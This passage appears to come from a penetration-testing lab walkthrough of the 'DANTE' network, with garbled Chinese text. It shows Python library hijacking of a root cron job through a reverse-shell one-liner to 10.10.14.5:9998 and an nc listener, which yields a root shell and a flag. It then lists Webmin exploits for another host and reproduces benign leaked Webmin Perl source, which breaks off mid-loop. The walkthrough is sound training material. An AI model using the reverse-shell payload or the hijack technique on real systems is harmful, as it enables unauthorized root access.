<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /etc/cron.d
<span class="nb">grep</span> <span class="nt">-r</span> apache_restart
</code></pre></div></div>

<p>ä½¿ç”¨ pspy å¯ä»¥æŸ¥æ‰¾åˆ°éšè—çš„å®šæ—¶ä»»åŠ¡ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ root ç”¨æˆ·ç›´æ¥ç”¨ /usr/sbin/CRON æ‰§è¡Œ apache_restart.pyã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2023/12/25 22:57:59 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1      | /sbin/init auto noprompt 
2023/12/25 22:58:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>24240  | /usr/sbin/CRON <span class="nt">-f</span> 
2023/12/25 22:58:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>24242  | /bin/sh <span class="nt">-c</span> python3 /home/frank/apache_restart.py<span class="p">;</span> <span class="nb">sleep </span>1<span class="p">;</span> <span class="nb">rm</span> /home/frank/call.py<span class="p">;</span> <span class="nb">sleep </span>1<span class="p">;</span> <span class="nb">rm</span> /home/frank/urllib.py                                                                                      
2023/12/25 22:58:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>24243  | python3 /home/frank/apache_restart.py 
2023/12/25 22:58:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>24244  | <span class="nb">sleep </span>1 
2023/12/25 22:58:02 CMD: <span class="nv">UID</span><span class="o">=</span>1000  <span class="nv">PID</span><span class="o">=</span>24245  | /snap/slack/65/usr/lib/slack/slack <span class="nt">--no-sandbox</span> <span class="nt">--executed-from</span><span class="o">=</span>/home/frank <span class="nt">--pid</span><span class="o">=</span>1805 <span class="nt">--enable-crashpad</span>                                                                                                  
2023/12/25 22:58:02 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>24246  | <span class="nb">rm</span> /home/frank/call.py 
2023/12/25 22:58:02 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>24247  | <span class="nb">sleep </span>1 
2023/12/25 22:58:03 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>24248  | 
</code></pre></div></div>
<p>ä½† apache_restart.py æœ¬èº«æ— æ³•ä¿®æ”¹ï¼Œä½† apache_restart.py è°ƒç”¨äº† call.py å’Œ urllib åº“ï¼Œç”±äº python ä¸­è°ƒç”¨åº“æ—¶ä¼šä¼˜å…ˆä»å½“å‰ç›®å½•åŠ è½½ï¼Œå¦‚æœç›´æ¥åœ¨ /home/frank ç›®å½•ä¸‹å†™å…¥ urllib.pyï¼Œé‚£ä¹ˆç¨‹åºä¼šä¼˜å…ˆåŠ è½½æˆ‘ä»¬ç¼–å†™çš„ urllib.pyã€‚</p>

<p>ç¼–å†™ä¸€ä¸ªåå¼¹ shell çš„ python è„šæœ¬ã€‚</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span><span class="p">,</span><span class="n">pty</span><span class="p">,</span><span class="n">socket</span><span class="p">;</span><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">();</span><span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">"</span><span class="s">10.10.14.5</span><span class="sh">"</span><span class="p">,</span><span class="mi">9998</span><span class="p">));[</span><span class="n">os</span><span class="p">.</span><span class="nf">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">fileno</span><span class="p">(),</span><span class="n">f</span><span class="p">)</span><span class="k">for</span> <span class="n">f</span> <span class="ow">in</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">)];</span><span class="n">pty</span><span class="p">.</span><span class="nf">spawn</span><span class="p">(</span><span class="sh">"</span><span class="s">/bin/bash</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>
<p>ç›‘å¬ 9998 ç«¯å£</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvp</span> 9998
</code></pre></div></div>
<p>å°† python è„šæœ¬å†™å…¥ /home/frank/urllib.py</p>

<p>ç­‰å¾…ä¸€æ®µæ—¶é—´åæˆåŠŸå¾—åˆ° root shellã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â””â”€<span class="nv">$ </span>nc <span class="nt">-lvvp</span> 9998
Listening on 0.0.0.0 9998
Connection received on 10.10.110.3 19185
root@DANTE-NIX02:~# <span class="nb">pwd
pwd</span>
/root
root@DANTE-NIX02:~# <span class="nb">cat</span> /root/flag.txt
<span class="nb">cat</span> /root/flag.txt
DANTE<span class="o">{</span>L0v3_m3_S0m3_H1J4CK1NG_XD<span class="o">}</span>
root@DANTE-NIX02:~# 
</code></pre></div></div>

<h1 id="linux-17216117">Linux: 172.16.1.17</h1>
<p>å¼€æ”¾ç«¯å£ï¼š</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>172.16.1.17	80
172.16.1.17	139
172.16.1.17	445
172.16.1.17	10000
</code></pre></div></div>
<h2 id="80-ç«¯å£æºç æ³„éœ²">80 ç«¯å£æºç æ³„éœ²</h2>
<p>80 ç«¯å£éƒ¨ç½²äº† Apache æœåŠ¡ï¼Œç»™å‡ºäº†ä¸€ä¸ª webmin-1.900.zip æ–‡ä»¶ã€‚</p>

<p>æ³„éœ²å‡ºçš„ webmin ç‰ˆæœ¬ä¸º 1.900ï¼Œè¯¥ç‰ˆæœ¬å­˜åœ¨è¯¸å¤šæ¼æ´ï¼Œå¯ä»¥ç›´æ¥åœ¨ searchsploit ä¸­æœç´¢ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Webmin 1.900 - Remote Command Execution <span class="o">(</span>Metasploit<span class="o">)</span>                                       | cgi/remote/46201.rb
Webmin 1.910 - <span class="s1">'Package Updates'</span> Remote Command Execution <span class="o">(</span>Metasploit<span class="o">)</span>                     | linux/remote/46984.rb
Webmin 1.920 - Remote Code Execution                                                       | linux/webapps/47293.sh
Webmin 1.920 - Unauthenticated Remote Code Execution <span class="o">(</span>Metasploit<span class="o">)</span>                          | linux/remote/47230.rb
Webmin 1.962 - <span class="s1">'Package Updates'</span> Escape Bypass RCE <span class="o">(</span>Metasploit<span class="o">)</span>                            | linux/webapps/49318.rb
Webmin 1.973 - <span class="s1">'run.cgi'</span> Cross-Site Request Forgery <span class="o">(</span>CSRF<span class="o">)</span>                                 | linux/webapps/50144.py
Webmin 1.973 - <span class="s1">'save_user.cgi'</span> Cross-Site Request Forgery <span class="o">(</span>CSRF<span class="o">)</span>                           | linux/webapps/50126.py
Webmin 1.984 - Remote Code Execution <span class="o">(</span>Authenticated<span class="o">)</span>                                       | linux/webapps/50809.py
Webmin 1.996 - Remote Code Execution <span class="o">(</span>RCE<span class="o">)</span> <span class="o">(</span>Authenticated<span class="o">)</span>                                 | linux/webapps/50998.py
Webmin 1.x - HTML Email Command Execution                                                  | cgi/webapps/24574.txt
Webmin &lt; 1.290 / Usermin &lt; 1.220 - Arbitrary File Disclosure                               | multiple/remote/1997.php
Webmin &lt; 1.290 / Usermin &lt; 1.220 - Arbitrary File Disclosure                               | multiple/remote/2017.pl
Webmin &lt; 1.920 - <span class="s1">'rpc.cgi'</span> Remote Code Execution <span class="o">(</span>Metasploit<span class="o">)</span>                              | linux/webapps/47330.rb
<span class="nt">-------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
Shellcodes: No Results

</code></pre></div></div>

<p>http://172.16.1.17/webmin/ ç›´æ¥ç»™å‡ºäº†ä¸€ä¸ª perl æ–‡ä»¶ã€‚</p>
<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/perl</span>
<span class="c1"># Display all Webmin modules visible to the current user</span>

<span class="k">BEGIN</span> <span class="p">{</span> <span class="nb">push</span><span class="p">(</span><span class="nv">@INC</span><span class="p">,</span> <span class="p">"</span><span class="s2">.</span><span class="p">");</span> <span class="p">};</span>
<span class="k">use</span> <span class="nv">WebminCore</span><span class="p">;</span>

<span class="nv">&amp;init_config</span><span class="p">();</span>
<span class="nv">&amp;ReadParse</span><span class="p">();</span>
<span class="nv">$hostname</span> <span class="o">=</span> <span class="nv">&amp;get_display_hostname</span><span class="p">();</span>
<span class="nv">$ver</span> <span class="o">=</span> <span class="nv">&amp;get_webmin_version</span><span class="p">();</span>
<span class="nv">&amp;get_miniserv_config</span><span class="p">(</span><span class="o">\</span><span class="nv">%miniserv</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">real_os_type</span><span class="p">'})</span> <span class="p">{</span>
	<span class="k">if</span> <span class="p">(</span><span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">os_version</span><span class="p">'}</span> <span class="ow">eq</span> <span class="p">"</span><span class="s2">*</span><span class="p">")</span> <span class="p">{</span>
		<span class="nv">$ostr</span> <span class="o">=</span> <span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">real_os_type</span><span class="p">'};</span>
		<span class="p">}</span>
	<span class="k">else</span> <span class="p">{</span>
		<span class="nv">$ostr</span> <span class="o">=</span> <span class="p">"</span><span class="si">$gconfig</span><span class="s2">{'real_os_type'} </span><span class="si">$gconfig</span><span class="s2">{'real_os_version'}</span><span class="p">";</span>
		<span class="p">}</span>
	<span class="p">}</span>
<span class="k">else</span> <span class="p">{</span>
	<span class="nv">$ostr</span> <span class="o">=</span> <span class="p">"</span><span class="si">$gconfig</span><span class="s2">{'os_type'} </span><span class="si">$gconfig</span><span class="s2">{'os_version'}</span><span class="p">";</span>
	<span class="p">}</span>
<span class="nv">%access</span> <span class="o">=</span> <span class="nv">&amp;get_module_acl</span><span class="p">();</span>

<span class="c1"># Build a list of all modules</span>
<span class="nv">@modules</span> <span class="o">=</span> <span class="nv">&amp;get_visible_module_infos</span><span class="p">();</span>

<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">defined</span><span class="p">(</span><span class="nv">$in</span><span class="p">{'</span><span class="s1">cat</span><span class="p">'}))</span> <span class="p">{</span>
	<span class="c1"># Maybe redirect to some module after login</span>
	<span class="nb">local</span> <span class="nv">$goto</span> <span class="o">=</span> <span class="nv">&amp;get_goto_module</span><span class="p">(</span><span class="o">\</span><span class="nv">@modules</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="nv">$goto</span><span class="p">)</span> <span class="p">{</span>
		<span class="nv">&amp;redirect</span><span class="p">(</span><span class="nv">$goto</span><span class="o">-&gt;</span><span class="p">{'</span><span class="s1">dir</span><span class="p">'}</span><span class="o">.</span><span class="p">'</span><span class="s1">/</span><span class="p">');</span>
		<span class="nb">exit</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>

<span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">sysinfo</span><span class="p">'}</span> <span class="o">=</span> <span class="mi">0</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">sysinfo</span><span class="p">'}</span> <span class="o">==</span> <span class="mi">1</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">texttitles</span><span class="p">'})</span> <span class="p">{</span>
	<span class="nv">@args</span> <span class="o">=</span> <span class="p">(</span> <span class="nv">$text</span><span class="p">{'</span><span class="s1">main_title2</span><span class="p">'},</span> <span class="nb">undef</span> <span class="p">);</span>
	<span class="p">}</span>
<span class="k">else</span> <span class="p">{</span>
	<span class="nv">@args</span> <span class="o">=</span> <span class="p">(</span> <span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">nohostname</span><span class="p">'}</span> <span class="p">?</span> <span class="nv">$text</span><span class="p">{'</span><span class="s1">main_title2</span><span class="p">'}</span> <span class="p">:</span>
		    <span class="nv">&amp;text</span><span class="p">('</span><span class="s1">main_title</span><span class="p">',</span> <span class="nv">$ver</span><span class="p">,</span> <span class="nv">$hostname</span><span class="p">,</span> <span class="nv">$ostr</span><span class="p">),</span>
		  <span class="p">"</span><span class="s2">images/webmin-blue.png</span><span class="p">"</span> <span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">showlogin</span><span class="p">'})</span> <span class="p">{</span>
		<span class="nv">$args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$remote_user</span><span class="o">.</span><span class="p">"</span><span class="s2"> : </span><span class="p">"</span><span class="o">.</span><span class="nv">$args</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
		<span class="p">}</span>
	<span class="p">}</span>
<span class="nv">&amp;header</span><span class="p">(</span><span class="nv">@args</span><span class="p">,</span> <span class="nb">undef</span><span class="p">,</span> <span class="nb">undef</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span>
	<span class="nv">$tconfig</span><span class="p">{'</span><span class="s1">brand</span><span class="p">'}</span> <span class="p">?</span> 
	<span class="p">"</span><span class="s2">&lt;a href=</span><span class="si">$tconfig</span><span class="s2">{'brand_url'}&gt;</span><span class="si">$tconfig</span><span class="s2">{'brand'}&lt;/a&gt;</span><span class="p">"</span> <span class="p">:</span>
	<span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">brand</span><span class="p">'}</span> <span class="p">?</span> 
	<span class="p">"</span><span class="s2">&lt;a href=</span><span class="si">$gconfig</span><span class="s2">{'brand_url'}&gt;</span><span class="si">$gconfig</span><span class="s2">{'brand'}&lt;/a&gt;</span><span class="p">"</span> <span class="p">:</span>
	<span class="p">"</span><span class="s2">&lt;a href=http://www.webmin.com/&gt;</span><span class="si">$text</span><span class="s2">{'main_homepage'}&lt;/a&gt;</span><span class="p">"</span>
	<span class="p">);</span>
<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;center&gt;&lt;font size=+1&gt;</span><span class="p">",</span>
    <span class="nv">&amp;text</span><span class="p">('</span><span class="s1">main_version</span><span class="p">',</span> <span class="nv">$ver</span><span class="p">,</span> <span class="nv">$hostname</span><span class="p">,</span> <span class="nv">$ostr</span><span class="p">),"</span><span class="s2">&lt;/font&gt;&lt;/center&gt;</span><span class="se">\n</span><span class="p">"</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">nohostname</span><span class="p">'});</span>
<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;hr id='header_hr'&gt;&lt;p&gt;</span><span class="se">\n</span><span class="p">";</span>

<span class="k">print</span> <span class="nv">$text</span><span class="p">{'</span><span class="s1">main_header</span><span class="p">'};</span>

<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">@modules</span><span class="p">)</span> <span class="p">{</span>
	<span class="c1"># use has no modules!</span>
	<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;p class='main_none'&gt;&lt;b&gt;</span><span class="si">$text</span><span class="s2">{'main_none'}&lt;/b&gt;&lt;p&gt;</span><span class="se">\n</span><span class="p">";</span>
	<span class="p">}</span>
<span class="k">elsif</span> <span class="p">(</span><span class="nv">$gconfig</span><span class="p">{"</span><span class="s2">notabs_</span><span class="si">${base_remote_user}</span><span class="p">"}</span> <span class="o">==</span> <span class="mi">2</span> <span class="o">||</span>
    <span class="nv">$gconfig</span><span class="p">{"</span><span class="s2">notabs_</span><span class="si">${base_remote_user}</span><span class="p">"}</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">notabs</span><span class="p">'})</span> <span class="p">{</span>
	<span class="c1"># Generate main menu with all modules on one page</span>
	<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;center&gt;&lt;table id='mods' cellpadding=5 cellspacing=0 width=100%&gt;</span><span class="se">\n</span><span class="p">";</span>
	<span class="nv">$pos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="nv">$cols</span> <span class="o">=</span> <span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">nocols</span><span class="p">'}</span> <span class="p">?</span> <span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">nocols</span><span class="p">'}</span> <span class="p">:</span> <span class="mi">4</span><span class="p">;</span>
	<span class="nv">$per</span> <span class="o">=</span> <span class="mf">100.0</span> <span class="o">/</span> <span class="nv">$cols</span><span class="p">;</span>
	<span class="k">foreach</span> <span class="nv">$m</span> <span class="p">(</span><span class="nv">@modules</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="nv">$pos</span> <span class="o">%</span> <span class="nv">$cols</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="k">print</span> <span class="p">"</span><span class="s2">&lt;tr </span><span class="si">$cb</span><span class="s2">&gt;</span><span class="se">\n</span><span class="p">";</span> <span class="p">}</span>
		<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;td valign=top align=center width=</span><span class="si">$per</span><span class="se">\</span><span class="s2">%&gt;</span><span class="se">\n</span><span class="p">";</span>
		<span class="nb">local</span> <span class="nv">$idx</span> <span class="o">=</span> <span class="nv">$m</span><span class="o">-&gt;</span><span class="p">{'</span><span class="s1">index_link</span><span class="p">'};</span>
		<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;table border&gt;&lt;tr&gt;&lt;td&gt;&lt;a href=</span><span class="si">$gconfig</span><span class="s2">{'webprefix'}/</span><span class="si">$m</span><span class="s2">-&gt;{'dir'}/</span><span class="si">$idx</span><span class="s2">&gt;</span><span class="p">",</span>
		      <span class="p">"</span><span class="s2">&lt;img src=</span><span class="si">$m</span><span class="s2">-&gt;{'dir'}/images/icon.gif border=0 </span><span class="p">",</span>
		      <span class="p">"</span><span class="s2">width=48 height=48&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</span><span class="se">\n</span><span class="p">";</span>
		<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;a href=</span><span class="si">$gconfig</span><span class="s2">{'webprefix'}/</span><span class="si">$m</span><span class="s2">-&gt;{'dir'}/</span><span class="si">$idx</span><span class="s2">&gt;</span><span class="si">$m</span><span class="s2">-&gt;{'desc'}&lt;/a&gt;&lt;/td&gt;</span><span class="se">\n</span><span class="p">";</span>
		<span class="k">if</span> <span class="p">(</span><span class="nv">$pos</span> <span class="o">%</span> <span class="nv">$cols</span> <span class="o">==</span> <span class="nv">$cols</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="k">print</span> <span class="p">"</span><span class="s2">&lt;/tr&gt;</span><span class="se">\n</span><span class="p">";</span> <span class="p">}</span>
		<span class="nv">$pos</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;/table&gt;&lt;/center&gt;&lt;p&gt;&lt;hr id='mods_hr'&gt;</span><span class="se">\n</span><span class="p">";</span>
	<span class="p">}</span>
<span class="k">else</span> <span class="p">{</span>
	<span class="c1"># Display under categorised tabs</span>
	<span class="nv">&amp;ReadParse</span><span class="p">();</span>
	<span class="nv">%cats</span> <span class="o">=</span> <span class="nv">&amp;list_categories</span><span class="p">(</span><span class="o">\</span><span class="nv">@modules</span><span class="p">);</span>
	<span class="nv">@cats</span> <span class="o">=</span> <span class="nb">sort</span> <span class="p">{</span> <span class="nv">$b</span> <span class="ow">cmp</span> <span class="nv">$a</span> <span class="p">}</span> <span class="nb">keys</span> <span class="nv">%cats</span><span class="p">;</span>
	<span class="nv">$cats</span> <span class="o">=</span> <span class="nv">@cats</span><span class="p">;</span>
	<span class="nv">$per</span> <span class="o">=</span> <span class="nv">$cats</span> <span class="p">?</span> <span class="mf">100.0</span> <span class="o">/</span> <span class="nv">$cats</span> <span class="p">:</span> <span class="mi">100</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">defined</span><span class="p">(</span><span class="nv">$in</span><span class="p">{'</span><span class="s1">cat</span><span class="p">'}))</span> <span class="p">{</span>
		<span class="c1"># Use default category</span>
		<span class="k">if</span> <span class="p">(</span><span class="nb">defined</span><span class="p">(</span><span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">deftab</span><span class="p">'})</span> <span class="o">&amp;&amp;</span>
		    <span class="nv">&amp;indexof</span><span class="p">(</span><span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">deftab</span><span class="p">'},</span> <span class="nv">@cats</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
			<span class="nv">$in</span><span class="p">{'</span><span class="s1">cat</span><span class="p">'}</span> <span class="o">=</span> <span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">deftab</span><span class="p">'};</span>
			<span class="p">}</span>
		<span class="k">else</span> <span class="p">{</span>
			<span class="nv">$in</span><span class="p">{'</span><span class="s1">cat</span><span class="p">'}</span> <span class="o">=</span> <span class="nv">$cats</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
			<span class="p">}</span>
		<span class="p">}</span>
	<span class="k">elsif</span> <span class="p">(</span><span class="o">!</span><span class="nv">$cats</span><span class="p">{</span><span class="nv">$in</span><span class="p">{'</span><span class="s1">cat</span><span class="p">'}})</span> <span class="p">{</span>
		<span class="nv">$in</span><span class="p">{'</span><span class="s1">cat</span><span class="p">'}</span> <span class="o">=</span> <span class="p">"";</span>
		<span class="p">}</span>
	<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;table id='cattabs' border=0 cellpadding=0 cellspacing=0 height=20&gt;&lt;tr&gt;</span><span class="se">\n</span><span class="p">";</span>
	<span class="nv">$usercol</span> <span class="o">=</span> <span class="nb">defined</span><span class="p">(</span><span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">cs_header</span><span class="p">'})</span> <span class="o">||</span>
		   <span class="nb">defined</span><span class="p">(</span><span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">cs_table</span><span class="p">'})</span> <span class="o">||</span>
		   <span class="nb">defined</span><span class="p">(</span><span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">cs_page</span><span class="p">'});</span>
	<span class="k">foreach</span> <span class="nv">$c</span> <span class="p">(</span><span class="nv">@cats</span><span class="p">)</span> <span class="p">{</span>
		<span class="nv">$t</span> <span class="o">=</span> <span class="nv">$cats</span><span class="p">{</span><span class="nv">$c</span><span class="p">};</span>
		<span class="k">if</span> <span class="p">(</span><span class="nv">$in</span><span class="p">{'</span><span class="s1">cat</span><span class="p">'}</span> <span class="ow">eq</span> <span class="nv">$c</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;td class='usercoll' valign=top </span><span class="si">$cb</span><span class="s2">&gt;</span><span class="p">",</span> <span class="nv">$usercol</span> <span class="p">?</span> <span class="p">"</span><span class="s2">&lt;br&gt;</span><span class="p">"</span> <span class="p">:</span>
			  <span class="p">"</span><span class="s2">&lt;img src=images/lc2.gif alt=</span><span class="se">\"\"</span><span class="s2">&gt;</span><span class="p">","</span><span class="s2">&lt;/td&gt;</span><span class="se">\n</span><span class="p">";</span>
			<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;td class='usercolc' id='selectedcat' </span><span class="si">$cb</span><span class="s2">&gt;&amp;nbsp;&lt;b&gt;</span><span class="si">$t</span><span class="s2">&lt;/b&gt;&amp;nbsp;&lt;/td&gt;</span><span class="se">\n</span><span class="p">";</span>
			<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;td class='usercolr' valign=top </span><span class="si">$cb</span><span class="s2">&gt;</span><span class="p">",</span> <span class="nv">$usercol</span> <span class="p">?</span> <span class="p">"</span><span class="s2">&lt;br&gt;</span><span class="p">"</span> <span class="p">:</span>
			  <span class="p">"</span><span class="s2">&lt;img src=images/rc2.gif alt=</span><span class="se">\"\"</span><span class="s2">&gt;</span><span class="p">","</span><span class="s2">&lt;/td&gt;</span><span class="se">\n</span><span class="p">";</span>
			<span class="p">}</span>
		<span class="k">else</span> <span class="p">{</span>
			<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;td class='usercoll' valign=top </span><span class="si">$tb</span><span class="s2">&gt;</span><span class="p">",</span> <span class="nv">$usercol</span> <span class="p">?</span> <span class="p">"</span><span class="s2">&lt;br&gt;</span><span class="p">"</span> <span class="p">:</span>
			  <span class="p">"</span><span class="s2">&lt;img src=images/lc1.gif alt=</span><span class="se">\"\"</span><span class="s2">&gt;</span><span class="p">","</span><span class="s2">&lt;/td&gt;</span><span class="se">\n</span><span class="p">";</span>
			<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;td class='usercolc' </span><span class="si">$tb</span><span class="s2">&gt;&amp;nbsp;</span><span class="p">",</span>
			      <span class="p">"</span><span class="s2">&lt;a href=</span><span class="si">$gconfig</span><span class="s2">{'webprefix'}/?cat=</span><span class="si">$c</span><span class="s2">&gt;&lt;b&gt;</span><span class="si">$t</span><span class="s2">&lt;/b&gt;&lt;/a&gt;&amp;nbsp;&lt;/td&gt;</span><span class="se">\n</span><span class="p">";</span>
			<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;td class='usercolr' valign=top </span><span class="si">$tb</span><span class="s2">&gt;</span><span class="p">",</span> <span class="nv">$usercol</span> <span class="p">?</span> <span class="p">"</span><span class="s2">&lt;br&gt;</span><span class="p">"</span> <span class="p">:</span>
			  <span class="p">"</span><span class="s2">&lt;img src=images/rc1.gif alt=</span><span class="se">\"\"</span><span class="s2">&gt;</span><span class="p">","</span><span class="s2">&lt;/td&gt;</span><span class="se">\n</span><span class="p">";</span>
			<span class="p">}</span>
		<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;td width=10&gt;&lt;/td&gt;</span><span class="se">\n</span><span class="p">";</span>
		<span class="p">}</span>
	<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;/tr&gt;&lt;/table&gt; &lt;table id='mods' border=0 cellpadding=0 cellspacing=0 </span><span class="p">",</span>
              <span class="p">"</span><span class="s2">width=100% </span><span class="si">$cb</span><span class="s2">&gt;</span><span class="se">\n</span><span class="p">";</span>
	<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;tr&gt;&lt;td&gt;&lt;table width=100% cellpadding=5&gt;</span><span class="se">\n</span><span class="p">";</span>

	<span class="c1"># Display the modules in this category</span>
	<span class="nv">$pos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="nv">$cols</span> <span class="o">=</span> <span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">nocols</span><span class="p">'}</span> <span class="p">?</span> <span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">nocols</span><span class="p">'}</span> <span class="p">:</span> <span class="mi">4</span><span class="p">;</span>
	<span class="nv">$per</span> <span class="o">=</span> <span class="mf">100.0</span> <span class="o">/</span> <span class="nv">$cols</span><span class="p">;</span>
	<span class="k">foreach</span> <span class="nv">$m</span> <span class="p">(</span><span class="nv">@modules</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">next</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$m</span><span class="o">-&gt;</span><span class="p">{'</span><span class="s1">category</span><span class="p">'}</span> <span class="ow">ne</span> <span class="nv">$in</span><span class="p">{'</span><span class="s1">cat</span><span class="p">'});</span>

		<span class="k">if</span> <span class="p">(</span><span class="nv">$pos</span> <span class="o">%</span> <span class="nv">$cols</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="k">print</span> <span class="p">"</span><span class="s2">&lt;tr&gt;</span><span class="se">\n</span><span class="p">";</span> <span class="p">}</span>
		<span class="nb">local</span> <span class="nv">$idx</span> <span class="o">=</span> <span class="nv">$m</span><span class="o">-&gt;</span><span class="p">{'</span><span class="s1">index_link</span><span class="p">'};</span>
		<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;td valign=top align=center width=</span><span class="si">$per</span><span class="se">\</span><span class="s2">%&gt;</span><span class="se">\n</span><span class="p">";</span>
		<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;table border bgcolor=#ffffff&gt;&lt;tr&gt;&lt;td&gt;&lt;a href=</span><span class="si">$gconfig</span><span class="s2">{'webprefix'}/</span><span class="si">$m</span><span class="s2">-&gt;{'dir'}/</span><span class="si">$idx</span><span class="s2">&gt;</span><span class="p">",</span>
		      <span class="p">"</span><span class="s2">&lt;img src=</span><span class="si">$m</span><span class="s2">-&gt;{'dir'}/images/icon.gif alt=</span><span class="se">\"\"</span><span class="s2"> border=0&gt;&lt;/a&gt;</span><span class="p">",</span>
		      <span class="p">"</span><span class="s2">&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</span><span class="se">\n</span><span class="p">";</span>
		<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;a href=</span><span class="si">$gconfig</span><span class="s2">{'webprefix'}/</span><span class="si">$m</span><span class="s2">-&gt;{'dir'}/</span><span class="si">$idx</span><span class="s2">&gt;</span><span class="si">$m</span><span class="s2">-&gt;{'desc'}&lt;/a&gt;&lt;/td&gt;</span><span class="se">\n</span><span class="p">";</span>
